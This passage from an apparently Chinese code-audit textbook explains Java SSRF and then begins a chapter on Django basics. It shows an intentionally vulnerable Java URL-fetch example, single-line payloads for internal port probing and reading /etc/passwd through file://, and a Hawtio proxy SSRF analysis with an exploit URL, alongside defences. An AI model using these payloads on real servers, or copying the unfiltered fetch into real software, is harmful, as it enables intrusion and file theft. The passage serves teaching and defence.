\u670D\u52A1\u7AEF\u8BF7\u6C42\u4F2A\u9020\uFF08Server-Side Request Forge\uFF09\u7B80\u79F0 SSRF\uFF0C\u4E00\u822C\u60C5\u51B5\u4E0B\uFF0CSSRF\u653B\u51FB\u7684\u76EE\u6807\u662F\u4ECE\u5916\u7F51\u65E0\u6CD5\u8BBF\u95EE\u7684\u5185\u90E8\u7CFB\u7EDF\uFF08\u7531\u4E8E\u8BF7\u6C42\u7531\u670D\u52A1\u7AEF\u53D1\u8D77\uFF0C\u56E0\u6B64\u5B83\u80FD\u591F\u8BF7\u6C42\u5230\u670D\u52A1\u5668\u7684\u5185\u90E8\u7CFB\u7EDF\uFF09\u3002SSRF \u5F62\u6210\u539F\u56E0\u5927\u90FD\u662F\u7531\u4E8E\u670D\u52A1\u7AEF\u63D0\u4F9B\u4E86\u4ECE\u5176\u4ED6\u670D\u52A1\u5668\u5E94\u7528\u83B7\u53D6\u6570\u636E\u7684\u529F\u80FD\u4E14\u6CA1\u6709\u5BF9\u76EE\u6807\u5730\u5740\u505A\u8FC7\u6EE4\u4E0E\u9650\u5236\uFF0C\u4F8B\u5982\uFF1A\u4ECE\u6307\u5B9AURL\u5730\u5740\u83B7\u53D6\u7F51\u9875\u6587\u672C\u5185\u5BB9\uFF0C\u52A0\u8F7D\u6307\u5B9A\u5730\u5740\u7684\u56FE\u7247\u7B49\u529F\u80FD\u3002\r
\r
\u4F46\u662F\u548CPHP\u8BED\u8A00\u76F8\u6BD4\uFF0CJava \u4E2D\u7684SSRF\u7684\u5229\u7528\u662F\u6709\u5C40\u9650\u6027\u7684\uFF0CJava\u7F51\u7EDC\u8BF7\u6C42\u652F\u6301\u7684\u534F\u8BAE\u5305\u62EC\uFF1AHTTP\u3001HTTPS\u3001File\u3001FTP\u3001Mailto\u3001JAR\u3001Netdoc\u3002\u5B9E\u9645\u573A\u666F\u4E2D\uFF0C\u4E00\u822C\u5229\u7528HTTP/HTTPS\u534F\u8BAE\u6765\u63A2\u6D4B\u7AEF\u53E3\u3001\u66B4\u529B\u7A77\u4E3E\u7B49\uFF0C\u8FD8\u53EF\u4EE5\u5229\u7528file\u534F\u8BAE\u8BFB\u53D6/\u4E0B\u8F7D\u4EFB\u610F\u6587\u4EF6\u7B49\u3002\r
\r
\uFF081\uFF09SSRF\u6F0F\u6D1E\u6848\u4F8B\u4EE3\u7801\uFF1A\r
\r
\r
\r
String url = request.getParameter("url");\r
\r
String htmlContent;\r
\r
try {\r
\r
 URL u = new URL(url);//\u901A\u8FC7\u53C2\u6570url\u521B\u5EFA\u4E00\u4E2AURL\u5BF9\u8C61\r
\r
 URLConnection urlConnection = u.openConnection();\u5F00\u542Furl\u8FDE\u63A5\r
\r
 //\u6307\u5B9AURL\u7684\u8F93\u5165\u6D41\uFF0C\u5C06\u8FDE\u63A5\u7684\u54CD\u5E94\u5185\u5BB9\u4F5C\u4E3AUTF-8\u7F16\u7801\u663E\u793A\r
\r
 BufferedReader base = new BufferedReader(new InputStreamReader(urlConnection.getInputStream(), "UTF-8"));\r
\r
 StringBuffer html = new StringBuffer();\r
\r
 while ((htmlContent = base.readLine()) != null) {\r
\r
   html.append(htmlContent);}//\u5185\u5BB9\u6700\u4F73\u5230html\u53D8\u91CF\u4E2D\r
\r
   base.close();\r
\r
   print.println("<b>\u7AEF\u53E3\u63A2\u6D4B</b></br>");//\u6253\u5370\u5185\u5BB9\r
\r
   print.println("<b>url:" + url + "</b></br>");\r
\r
   print.println(html.toString());\r
\r
   print.flush();\r
\r
   } catch (Exception e) {//\u6253\u5370\u9519\u8BEF\u4FE1\u606F\r
\r
\u200B        e.printStackTrace();\r
\r
\u200B        print.println("ERROR!");}\r
\r
\r
\r
\u4EE5\u4E0A\u4EE3\u7801\u6D41\u7A0B\u5982\u4E0B\uFF1A\r
\r
l URL\u5BF9\u8C61\u7528openconnection()\u6253\u5F00\u8FDE\u63A5\uFF0C\u83B7\u5F97URLConnection\u7C7B\u5BF9\u8C61\uFF1B\r
\r
l \u4F7F\u7528InputStream()\u83B7\u53D6\u5B57\u8282\u6D41\uFF1B\r
\r
l \u7136\u540EInputStreamReader()\u5C06\u5B57\u8282\u6D41\u8F6C\u5316\u6210\u5B57\u7B26\u6D41\uFF1B\r
\r
l BufferedReader()\u5C06\u5B57\u7B26\u6D41\u4EE5\u7F13\u5B58\u5F62\u5F0F\u8F93\u51FA\u7684\u65B9\u5F0F\u6765\u5FEB\u901F\u83B7\u53D6\u7F51\u7EDC\u6570\u636E\u6D41\uFF1B\r
\r
l \u6700\u7EC8\u4E00\u884C\u4E00\u884C\u7684\u8F93\u5165\u5230 html \u53D8\u91CF\u4E2D\uFF0C\u8F93\u51FA\u5230\u6D4F\u89C8\u5668\u3002\r
\r
\u4EE3\u7801\u7684\u4E3B\u8981\u529F\u80FD\u6A21\u62DF\u4E86http \u8BF7\u6C42\uFF0C\u5982\u679C\u6CA1\u6709\u5BF9\u8BF7\u6C42\u5730\u5740\u8FDB\u884C\u9650\u5236\u548C\u8FC7\u6EE4\uFF0C\u5373\u53EF\u4EE5\u5229\u7528\u6765\u8FDB\u884C SSRF \u653B\u51FB\u3002\u82E5\u63A2\u6D4B\u5185\u7F51\u4E3B\u673AIP\u5730\u5740\u4E3A192.168.159.134\u662F\u5426\u5F00\u653E\u4E8680\u7AEF\u53E3\uFF0C\u5219\u4F7F\u7528Payload\u4E3A\uFF1Ahttp://localhost:8080/ssrf/ssrfTest?url=http://192.168.159.134:80\uFF0C\u82E5\u7AEF\u53E380\u5F00\u653E\uFF0C\u5219\u5982\u56FE13-18\u6240\u793A\u3002\u82E5\u7AEF\u53E3\u4E0D\u5F00\u653E\uFF0C\u5219\u6253\u5370\u201CERROR\u201D\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image630.jpg)\r
\r
\u56FE13-18 SSRF\u8FDB\u884C\u7AEF\u53E3\u63A2\u6D4B\r
\r
\u82E5\u8BFB\u53D6\u5BF9\u7AEF\u670D\u52A1\u5668\u7684\u6587\u4EF6\uFF0C\u5219\u4F7F\u7528Payload\u4E3Ahttp:// localhost:8080/ssrf/ssrfTest?url=file:///etc/passswd\u3002\u5982\u56FE13-19\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image632.jpg)\r
\r
\u56FE13-19 SSRF\u8FDB\u884C\u6587\u4EF6\u8BFB\u53D6\r
\r
### 13.6.2 Java\u4E2D\u7684SSRF\u6F0F\u6D1E\u9632\u5FA1\r
\r
\u5B9E\u9645\u573A\u666F\u4E2D\u53EF\u80FD\u51FA\u73B0 SSRF \u7684\u529F\u80FD\u70B9\u6709\u5F88\u591A\uFF0C\u4F8B\u5982\uFF1A\u83B7\u53D6\u8FDC\u7A0B URL \u56FE\u7247\u3001webmail\u6536\u53D6\u5176\u4ED6\u90AE\u7BB1\u90AE\u4EF6\u3001\u4ECE\u8FDC\u7A0B\u670D\u52A1\u5668\u8BF7\u6C42\u8D44\u6E90\u7B49\u7B49\u3002\u9488\u5BF9\u8FD9\u4E9B\u95EE\u9898\u76F8\u5173\u7B56\u7565\u5982\u4E0B\uFF1A\r
\r
l \u7EDF\u4E00\u9519\u8BEF\u4FE1\u606F\uFF0C\u907F\u514D\u7528\u6237\u53EF\u4EE5\u6839\u636E\u9519\u8BEF\u4FE1\u606F\u6765\u5224\u65AD\u8FDC\u7AEF\u670D\u52A1\u5668\u7684\u7AEF\u53E3\u72B6\u6001\u3002\r
\r
l \u9650\u5236\u8BF7\u6C42\u7684\u7AEF\u53E3\u4E3AHTTP\u5E38\u7528\u7AEF\u53E3\uFF0C\u4F8B\u5982\uFF1A80\u3001443\u30018080\u30018090\u7B49\u3002\r
\r
l \u7981\u7528\u4E0D\u9700\u8981\u7684\u534F\u8BAE\uFF0C\u4EC5\u5141\u8BB8HTTP\u548CHTTPS\u8BF7\u6C42\u3002\r
\r
l \u6839\u636E\u4E1A\u52A1\u9700\u6C42\uFF0C\u5C06\u8FD9\u7279\u5B9A\u7684\u57DF\u540D\u52A0\u5165\u5230\u767D\u540D\u5355\uFF0C\u62D2\u7EDD\u767D\u540D\u5355\u57DF\u540D\u4E4B\u5916\u7684\u8BF7\u6C42\u3002\r
\r
l \u6839\u636E\u8BF7\u6C42\u6765\u6E90\uFF0C\u5224\u5B9A\u8BF7\u6C42\u5730\u5740\u662F\u5426\u4E3A\u56FA\u5B9A\u8BF7\u6C42\u6765\u6E90\uFF0C\u5C06\u8FD9\u7279\u5B9A\u7684\u57DF\u540D\u6216IP\u52A0\u5165\u5230\u767D\u540D\u5355\uFF0C\u62D2\u7EDD\u767D\u540D\u5355\u4E4B\u5916\u7684\u8BF7\u6C42\u3002\r
\r
l \u82E5\u4E1A\u52A1\u9700\u6C42\u548C\u8BF7\u6C42\u6765\u6E90\u975E\u56FA\u5B9A\uFF0C\u53EF\u4EE5\u5B9A\u4E49\u4E00\u4E2ASSRF\u6F0F\u6D1E\u9632\u5FA1\u51FD\u6570ssrfCheck\u3002\r
\r
### 13.6.3 Hawtio\u5E73\u53F0SSRF\u6F0F\u6D1E\u5206\u6790\r
\r
\uFF081\uFF09\u6F0F\u6D1E\u5206\u6790\r
\r
Hawtio\u662F\u7528\u4E8E\u7BA1\u7406Java\u5E94\u7528\u7A0B\u5E8F\u7684\u8F7B\u578B\u6A21\u5757\u5316Web\u63A7\u5236\u53F0\u3002Hawt Hawtio\u5C0F\u4E8E2.5.0\u7248\u672C\u90FD\u5BB9\u6613\u53D7\u5230SSRF\u7684\u653B\u51FB\uFF0C\u8FDC\u7A0B\u653B\u51FB\u8005\u53EF\u4EE5\u901A\u8FC7\u8DEF\u5F84\u4E3A\u201Chttp://ip/proxy/\u5730\u5740\u201D\u7684\u5F62\u5F0F\u53D1\u9001\u7279\u5B9A\u7684\u5B57\u7B26\u4E32\uFF0C\u4ECE\u800C\u5F71\u54CD\u670D\u52A1\u5668\u5230\u4EFB\u610F\u4E3B\u673A\u7684HTTP\u8BF7\u6C42\u3002\u8BE5\u5E73\u53F0\u9875\u9762\u5982\u56FE13-20\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image634.jpg)\r
\r
\u56FE13-20 Hawtio\u5E73\u53F0\u9996\u9875\u56FE\r
\r
\u901A\u8FC7\u53CD\u7F16\u8BD1hawtio-system-2.5.0.jar\u5305\u627E\u5230\u76F8\u5173\u6587\u4EF6\uFF0C\u8BE5\u5E73\u53F0SSRF\u6F0F\u6D1E\u5B58\u5728\u4E8E\u6587\u4EF6/src/main/java/io/hawt/web/proxy/ProxyServlet.java\u4E2D\uFF0C\u5176\u90E8\u5206\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
protected void service(HttpServletRequest servletRequest, HttpServletResponse servletResponse)throws ServletException, IOException {\r
\r
//\u901A\u8FC7\u8BF7\u6C42servletRequest\u83B7\u5F97URL\u5730\u5740\r
\r
\u200B    **ProxyAddress proxyAddress = parseProxyAddress(servletRequest);**\r
\r
\u200B    if (proxyAddress == null || proxyAddress.getFullProxyUrl() == null) {\r
\r
//\u5982\u679CURL\u5730\u5740\u4E3A\u7A7A\uFF0C\u5219\u6253\u5370\u5730\u5740\u627E\u4E0D\u5230\r
\r
\u200B      servletResponse.setStatus(HttpServletResponse.SC_NOT_FOUND);\r
\r
\u200B      return;\r
\r
\u200B    }\r
\r
\u200B    if (proxyAddress instanceof ProxyDetails) {\r
\r
\u200B      //\u5B9E\u4F8B\u5316\u4E3AProxyDetails\u5BF9\u8C61\r
\r
\u200B      **ProxyDetails details = (ProxyDetails) proxyAddress;**\r
\r
\u200B      if (**!whitelist.isAllowed(details)**) {\r
\r
//\u5982\u679C\u4E0D\u5728\u767D\u540D\u5355\uFF0C\u5219\u6253\u5370\u4E3B\u673A\u4E0D\u5141\u8BB8\r
\r
\u200B        ServletHelpers.doForbidden(servletResponse, ForbiddenReason.HOST_NOT_ALLOWED);\r
\r
\u200B        return;\r
\r
\u200B      }\r
\r
\u200B    }\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u7684\u4E3B\u8981\u6D41\u7A0B\u4E3A\uFF1A\r
\r
l \u901A\u8FC7parseProxyAddress\u51FD\u6570\u83B7\u53D6URL\u5730\u5740\uFF1B\r
\r
l \u5224\u65ADproxyAddress\u662F\u5426\u4E3A\u7A7A\uFF0C\u82E5\u4E0D\u4E3A\u7A7A\u5219\u901A\u8FC7whitelist.isAllowed()\u5224\u65AD\u8BE5 URL \u662F\u5426\u5728\u767D\u540D\u5355\u91CC\uFF1B\r
\r
l \u82E5\u4E0D\u5728\u767D\u540D\u5355\u4E2D\u5219\u6253\u5370\u201CHOST_NOT_ALLOWED\u201D\u3002\r
\r
\u5BF9\u767D\u540D\u5355whitelist\u51FD\u6570\u8FDB\u884C\u5BA1\u8BA1\uFF0C\u5176\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
public ProxyWhitelist(String **whitelistStr**, boolean probeLocal) {\r
\r
\u200B    if (Strings.isBlank(whitelistStr)) {\r
\r
\u200B      whitelist = new CopyOnWriteArraySet<>();\r
\r
\u200B      regexWhitelist = Collections.emptyList();\r
\r
\u200B    } else {\r
\r
**//\u7528\u6237\u81EA\u5B9A\u4E49\u7684\u767D\u540D\u5355\uFF0C\u901A\u8FC7whitelistStr\u5B57\u7B26\u4E32\u4F20\u9012\u8FDB\u6765\uFF0C\u5E76\u901A\u8FC7\u9017\u53F7\u5206\u9694\u3002**\r
\r
\u200B      **whitelist = new CopyOnWriteArraySet<>(filterRegex(Strings.split(whitelistStr, ",")));**\r
\r
 **regexWhitelist = buildRegexWhitelist(Strings.split(whitelistStr, ","));}**\r
\r
\u200B    if (probeLocal) {\r
\r
\u200B      LOG.info("Probing local addresses ...");\r
\r
\u200B      initialiseWhitelist();\r
\r
\u200B    } else {\r
\r
\u200B      LOG.info("Probing local addresses disabled");\r
\r
**//\u7A0B\u5E8F\u81EA\u52A8\u6DFB\u52A0\u767D\u540D\u5355\u4E3Alocalhost\u548C127.0.0.1**\r
\r
\u200B      **whitelist.add("localhost");**\r
\r
\u200B      **whitelist.add("127.0.0.1");**\r
\r
\u200B    }\r
\r
\u200B    LOG.info("Initial proxy whitelist: {}", whitelist);\r
\r
  }\r
\r
...\r
\r
\r
\r
\u4E0A\u8FF0\u767D\u540D\u5355\u5305\u542B\u4E24\u79CD\u65B9\u5F0F\uFF1A\r
\r
l \u5224\u65AD URL \u662F\u5426\u4E3A localhost\u3001127.0.0.1\u3002\r
\r
l \u7528\u6237\u81EA\u5DF1\u66F4\u65B0\u7684\u767D\u540D\u5355\u5217\u8868\uFF0C\u5982\u679C\u4E0D\u662F\u8FD4\u56DE false\u3002\r
\r
\u7A0B\u5E8F\u5728\u8FDB\u884CURL\u7684\u4F20\u9012\u8FC7\u7A0B\u4E2D\uFF0C\u4F7F\u7528\u767D\u540D\u5355\u8FDB\u884C\u4E86\u9650\u5236\u3002\u4F46\u662F\uFF0C\u7A0B\u5E8F\u5E76\u6CA1\u6709\u5BF9\u7AEF\u53E3\u3001\u534F\u8BAE\u8FDB\u884C\u76F8\u5E94\u7684\u9650\u5236\uFF0C\u8FD9\u5BFC\u81F4\u4E86SSRF\u6F0F\u6D1E\u4EA7\u751F\u3002\r
\r
\uFF082\uFF09\u6F0F\u6D1E\u5229\u7528\r
\r
\u5F53\u7528\u6237\u8BBF\u95EE\u5730\u5740\u4E3Ahttp://ip:8080/proxy/http://127.0.0.1:80/testcms/\u65F6\uFF0C\u5C06\u901A\u8FC7SSRF\u6F0F\u6D1E\u6253\u5370\u672C\u673A80\u7AEF\u53E3\u7684\u6D4B\u8BD5CMS\u9875\u9762\uFF0C\u5982\u56FE13-21\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image636.jpg)\r
\r
\u56FE13-21 SSRF\u6F0F\u6D1E\u6D4B\u8BD5\u56FE\r
\r
## 13.7 \u5355\u5143\u5C0F\u7ED3\r
\r
\u672C\u5355\u5143\u4E3B\u8981\u5B66\u4E60\u4E86\u4EE3\u7801\u5BA1\u8BA1\u4E2D\u7684Java\u4EE3\u7801\u5BA1\u8BA1\u90E8\u5206\uFF0C\u5206\u522B\u5305\u62EC\uFF1AJava\u4EE3\u7801\u5BA1\u8BA1\u7684\u5165\u95E8\u77E5\u8BC6\u3001Java\u4EE3\u7801\u5BA1\u8BA1\u7684\u5E38\u89C1\u6F0F\u6D1E\uFF08SQL\u6CE8\u5165\u6F0F\u6D1E\u3001XSS\u6F0F\u6D1E\u3001\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u3001\u6587\u4EF6\u64CD\u4F5C\u6F0F\u6D1E\uFF09\u3002\u901A\u8FC7\u5BF9\u5E38\u89C1Java\u6F0F\u6D1E\u6848\u4F8B\u8FDB\u884C\u5217\u4E3E\uFF0C\u4F7F\u8BFB\u8005\u719F\u6089\u5E38\u89C1\u7684Java\u4EE3\u7801\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u65B9\u6CD5\u3002\r
\r
\r
\r
 \r
\r
# \u5355\u514314 Python\u6846\u67B6\u5B89\u5168\r
\r
\u5E38\u89C1\u7684Python\u6846\u67B6\u6709\uFF1ADjango\u3001Flask\u3001Tornado\uFF0C\u672C\u5355\u5143\u5C06\u8BE6\u89E3\u4ECB\u7ECDPython\u6846\u67B6\u7684\u4EE3\u7801\u5BA1\u8BA1\uFF0C\u5BF9\u6846\u67B6\u4E2D\u5E38\u89C1\u7684\u5B89\u5168\u6F0F\u6D1E\u8FDB\u884C\u4ECB\u7ECD\uFF0C\u5176\u4E3B\u8981\u5206\u4E3A\u4E09\u4E2A\u90E8\u5206\u8FDB\u884C\u4ECB\u7ECD\u3002\r
\r
\u7B2C\u4E00\u90E8\u5206\u4ECB\u7ECDPython\u7684\u6700\u4E3B\u6D41\u6846\u67B6Django\uFF0C\u4ECE\u8BE5\u6846\u67B6\u7684\u7B80\u4ECB\u53CA\u642D\u5EFA\u5F00\u59CB\uFF0C\u968F\u540E\u4ECB\u7ECDDjango\u4E2D\u53EF\u80FD\u5B58\u5728\u7684Web\u5B89\u5168\u6F0F\u6D1E\uFF0C\u5305\u62EC\uFF1AXSS\u6F0F\u6D1E\u3001CSRF\u6F0F\u6D1E\u3001SQL\u6CE8\u5165\u6F0F\u6D1E\u3001\u683C\u5F0F\u5316\u5B57\u7B26\u4E32\u6F0F\u6D1E\u7B49\u3002\r
\r
\u7B2C\u4E8C\u90E8\u5206\u4ECB\u7ECDPython\u6846\u67B6\u7684Flask\u6846\u67B6\uFF0C\u4ECB\u7ECDFlask\u7684\u529F\u80FD\u3001\u76EE\u5F55\u7ED3\u6784\u3001\u9879\u76EE\u6D41\u7A0B\u7B49\uFF0C\u7136\u540E\u4ECB\u7ECDFlask\u7684SSTI\u6F0F\u6D1E\u3002\r
\r
\u7B2C\u4E09\u90E8\u5206\u4ECB\u7ECDPython\u6846\u67B6\u7684Tornado\u6846\u67B6\uFF0C\u901A\u8FC7\u5BF9Tornado\u7684\u5B89\u88C5\u4E0E\u6848\u4F8B\u8FDB\u884C\u8BB2\u89E3\uFF0C\u4ECE\u800C\u4ECB\u7ECD\u8BE5\u6846\u67B6\u7684\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\u3002\r
\r
**\u5355\u5143\u6784\u56FE\uFF1A**\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image638.jpg)\r
\r
**\u5355\u5143\u76EE\u6807\uFF1A**\r
\r
\\1.  \u719F\u6089Python\u5E38\u7528\u6846\u67B6\u57FA\u7840\u77E5\u8BC6\uFF1B\r
\r
\\2.  \u719F\u6089Django\u6846\u67B6\u4E2D\u5E38\u89C1\u6F0F\u6D1E\uFF1B\r
\r
\\3.  \u4E86\u89E3Flask\u6846\u67B6\u7684SSTI\u6F0F\u6D1E\uFF1B\r
\r
\\4.  \u4E86\u89E3Tornado\u6846\u67B6\u4E2D\u7684\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\u3002\r
\r
## 14.1 Django\u6846\u67B6\u4ECB\u7ECD\r
\r
### 14.1.1 Django\u6846\u67B6\u7B80\u4ECB\r
\r
\\1. Django\u6846\u67B6\u4E0EMVT\u6A21\u5F0F\r
\r
Django\u6846\u67B6\u662F\u4E00\u79CD\u7531Python\u8BED\u8A00\u7F16\u5199\u7684\u5F00\u653E\u6E90\u4EE3\u7801\u7684Web\u5E94\u7528\u6846\u67B6\uFF0CDjango\u5E94\u7528\u6846\u67B6\u4E3A\u4E86\u964D\u4F4E\u5404\u4E2A\u90E8\u4EF6\u7684\u8026\u5408\u6027\uFF0C\u5C06Web\u6846\u67B6\u5206\u4E3A\u4E09\u4E2A\u90E8\u5206\uFF1AModel\uFF08\u6A21\u578B\uFF09\u3001Template\uFF08\u6A21\u677F\uFF09\u3001\u89C6\u56FE\uFF08View\uFF09\uFF0C\u5373MVT\u6A21\u5F0F\u3002\r
\r
\u4E0B\u9762\u5BF9MVT\u6A21\u5F0F\u4E2D\u5404\u6A21\u578B\u8FDB\u884C\u4ECB\u7ECD\uFF1A\r
\r
l Model\uFF08\u6A21\u578B\uFF09\uFF1A\u6570\u636E\u5B58\u53D6\u5C42\uFF0C\u5176\u8D1F\u8D23\u4E1A\u52A1\u5BF9\u8C61\u4E0E\u6570\u636E\u5E93\u7684\u5BF9\u8C61(ORM)\uFF1B\r
\r
l Template\uFF08\u6A21\u7248\uFF09\uFF1A\u8868\u73B0\u5C42\uFF0C\u5176\u8D1F\u8D23\u5982\u4F55\u628A\u9875\u9762\u5C55\u793A\u7ED9\u7528\u6237\uFF1B\r
\r
l View\uFF08\u89C6\u56FE\uFF09\uFF1A\u4E1A\u52A1\u903B\u8F91\u5C42\uFF0C\u5176\u8D1F\u8D23\u4E1A\u52A1\u903B\u8F91\u5E76\u5728\u9002\u5F53\u7684\u65F6\u5019\u8C03\u7528Model\u548CTemplate\uFF1B\r
\r
\u6B64\u5916\uFF0CDjango\u8FD8\u6709\u4E00\u4E2AURLS\u63A7\u5236\u5668\uFF0C\u5B83\u7684\u4F5C\u7528\u662F\u5C06\u6BCF\u4E2AURL\u7684\u9875\u9762\u8BF7\u6C42\u5206\u53D1\u7ED9\u4E0D\u540C\u7684View\u5904\u7406\uFF0CView\u518D\u8C03\u7528\u76F8\u5E94\u7684Model\u548CTemplate\u3002\r
\r
\\2. Django\u6D41\u7A0B\r
\r
Django\u6846\u67B6\u5904\u7406HTTP\u8BF7\u6C42\u7684\u8FC7\u7A0B\u5982\u56FE14-1\u6240\u793A\uFF0C\u5176\u4E3B\u8981\u5305\u62EC\u4EE5\u4E0B\u51E0\u90E8\u5206\u3002\r
\r
\uFF081\uFF09  \u7528\u6237\u5728\u9875\u9762\u8F93\u5165URL\uFF0C\u5C06\u5176\u53D1\u9001\u7ED9URLS\u63A7\u5236\u5668\uFF1B\r
\r
\uFF082\uFF09  URLS\u63A7\u5236\u5668\u6839\u636EURL\u5339\u914D\u76F8\u5E94\u89C6\u56FE\u51FD\u6570\u7ED9\u5BF9\u5E94\u7684View\u8FDB\u884C\u5904\u7406\uFF1B\r
\r
\uFF083\uFF09  \u5BF9\u5E94\u7684View\u5BF9\u4E1A\u52A1\u903B\u8F91\u8FDB\u884C\u5904\u7406\uFF0C\u5E76\u53D1\u9001\u7ED9Models\u8BFB\u53D6\u6570\u636E\uFF1B\r
\r
\uFF084\uFF09  Models\u5411\u6570\u636E\u5E93\u4E2D\u8BFB\u53D6\u6570\u636E\uFF1B\r
\r
\uFF085\uFF09  Models\u5C06\u6570\u636E\u8FD4\u56DE\u7ED9\u5BF9\u5E94\u7684View\uFF1B\r
\r
\uFF086\uFF09  View\u5C06\u8981\u5C55\u793A\u7684\u6570\u636E\u5E72\u4F1A\u7ED9Template\u6A21\u5757\u8FDB\u884CHTML\u62FC\u63A5\uFF1B\r
\r
\uFF087\uFF09  Template\u5C06HTML\u6A21\u677F\u6587\u4EF6\u8FD4\u56DE\u7ED9\u7528\u6237\u663E\u793A\u9875\u9762\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image640.jpg)\r
\r
\u56FE14-1 Django\u6D41\u7A0B\u56FE\r
\r
\\3. Django\u76EE\u5F55\u7ED3\u6784\r
\r
\u5F53\u4F7F\u7528django-admin\u547D\u4EE4\uFF08\u751F\u6210\u9879\u76EE\u5DE5\u7A0B\u7684\u547D\u4EE4\uFF09\u521B\u5EFA\u4E00\u4E2A\u540D\u79F0\u4E3Ademo\u7684\u9879\u76EE\uFF0C\u547D\u4EE4\u4E3A\u201Cdjango-admin startproject demo\u201D\uFF0C\u8BE5\u9879\u76EE\u7684\u76EE\u5F55\u7ED3\u6784\u5982\u56FE14-2\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image642.gif)\r
\r
\u56FE14-2 Django\u76EE\u5F55\u7ED3\u6784\u56FE\r
\r
\u4E0B\u9762\u5BF9\u8BE5\u9879\u76EE\u76EE\u5F55\u7684\u4E3B\u8981\u6587\u4EF6\u8FDB\u884C\u4ECB\u7ECD\uFF1A\r
\r
\uFF081\uFF09  setting.py\uFF1A\u9879\u76EE\u7684\u6574\u4F53\u914D\u7F6E\u6587\u4EF6\uFF1B\r
\r
\uFF082\uFF09  urls.py\uFF1A\u8DEF\u7531\u6587\u4EF6\uFF0C\u9879\u76EE\u7684URL\u548C\u51FD\u6570\u7684\u5BF9\u5E94\u5173\u7CFB\uFF1B\r
\r
\uFF083\uFF09  wsgi.py\uFF1A\u9879\u76EE\u4E0EWSGI\u517C\u5BB9\u7684Web\u670D\u52A1\u5668\u5165\u53E3\uFF1B\r
\r
\uFF084\uFF09  manage.py\uFF1A\u9879\u76EE\u7BA1\u7406\u6587\u4EF6\uFF0C\u7528\u6237\u53EF\u901A\u8FC7\u5B83\u6765\u7BA1\u7406\u9879\u76EE\u3002\r
\r
\\4. Django\u4E2D\u7684View\u51FD\u6570\r
\r
Django\u7684View\u51FD\u6570\u7528\u4E8E\u5904\u7406HTTP\u8BF7\u6C42\u7684\u903B\u8F91\u4E1A\u52A1\uFF0C\u5176\u4E3B\u8981\u5305\u542B\u4E24\u4E2A\u6838\u5FC3\u5BF9\u8C61\uFF1AHttpRequest\u5BF9\u8C61\u548CHttpResponse\u5BF9\u8C61\uFF0C\u5176\u6982\u51B5\u56FE14-3\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image644.jpg)\r
\r
\u56FE14-3 View\u51FD\u6570\u6982\u51B5\u56FE\r
\r
\uFF081\uFF09  HttpRequest\u5BF9\u8C61\r
\r
\u5F53\u8BF7\u6C42\u4E00\u4E2A\u9875\u9762\u65F6\uFF0CDjango \u521B\u5EFA\u4E00\u4E2A HttpRequest\u5BF9\u8C61\u5305\u542B\u539F\u6570\u636E\u7684\u8BF7\u6C42\u3002Django \u52A0\u8F7D\u9002\u5F53\u7684\u89C6\u56FE\uFF0C\u901A\u8FC7 HttpRequest\u4F5C\u4E3A\u89C6\u56FE\u51FD\u6570\u7684\u7B2C\u4E00\u4E2A\u53C2\u6570\u3002\u6BCF\u4E2A\u89C6\u56FE\u8D1F\u8D23\u8FD4\u56DE\u4E00\u4E2AHttpResponse\u76EE\u6807\u3002\r
\r
HttpRequest\u5BF9\u8C61\u5305\u542B\u5F88\u591A\u53C2\u6570\u5BF9HTTP\u8BF7\u6C42\u8FDB\u884C\u8BE6\u7EC6\u5904\u7406\uFF0C\u5305\u62EC\uFF1Apath\u3001method\u3001Cookies\u3001FILES\u3001USER\u3001Session\u7B49\u3002\u4E0B\u9762\u53EA\u7ED9\u51FA\u51E0\u79CD\u5E38\u89C1\u7684\u8BF7\u6C42\u53C2\u6570\uFF1A\r
\r
l Method\uFF1A\u8BF7\u6C42\u4E2D\u4F7F\u7528HTTP\u65B9\u6CD5\u7684\u5B57\u7B26\u4E32\u8868\u793A\uFF0C\u4F8B\u5982\uFF1Areq.method=\u201DPOST\u201D\uFF1B\r
\r
l COOKIE\uFF1AHTTP\u4E2D\u7684Cookies\u7684\u6807\u51C6\uFF0C\u952E\u503C\u5BF9\u5F62\u5F0F\uFF1B\r
\r
l FILES\uFF1A\u5305\u542B\u6240\u6709\u4E0A\u4F20\u6587\u4EF6\u7684\u7C7B\u5B57\u5178\u5BF9\u8C61\uFF1B\r
\r
l USER\uFF1A\u662F\u4E00\u4E2Adjango.contrib.auth.models.User\u5BF9\u8C61\uFF0C\u4EE3\u8868\u5F53\u524D\u767B\u9646\u7684\u7528\u6237\uFF1B\r
\r
l Sessions\uFF1A\u5F53\u524D\u4F1A\u8BDD\u7684\u5B57\u5178\u5BF9\u8C61\u3002\r
\r
\uFF082\uFF09  HttpResponse\u5BF9\u8C61\r
\r
